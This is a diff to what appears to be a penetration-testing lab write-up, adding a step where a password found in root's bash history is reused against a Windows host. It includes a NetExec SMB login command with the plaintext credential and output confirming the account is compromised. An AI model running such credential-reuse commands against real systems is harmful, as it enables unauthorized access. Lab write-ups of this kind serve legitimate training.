@@ -316,4 +316,12 @@ So after trying the user `ghill_sa` and failing i tried root and now i have root
 # Compromising `ghill_sa` on workstation
 So now i have root access i looked at roots `.bash_history` and found a password `echo 'P@ssw0rd!'`
 
-I wanted to try this for the only user i have which is `ghill_sa`
+I wanted to try this for the only user i have which is `ghill_sa` 
+
+```python
+nxc smb EC2AMAZ-NS87CNK.hsm.local -u 'ghill_sa' -p 'P@ssw0rd!' --local-auth 
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  [*] Windows 11 / Server 2025 Build 26100 x64 (name:EC2AMAZ-NS87CNK) (domain:EC2AMAZ-NS87CNK) (signing:False) (SMBv1:None)
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  [+] EC2AMAZ-NS87CNK\ghill_sa:P@ssw0rd!
+```
+This user has now been compromised, now i can start some more enumeration
+
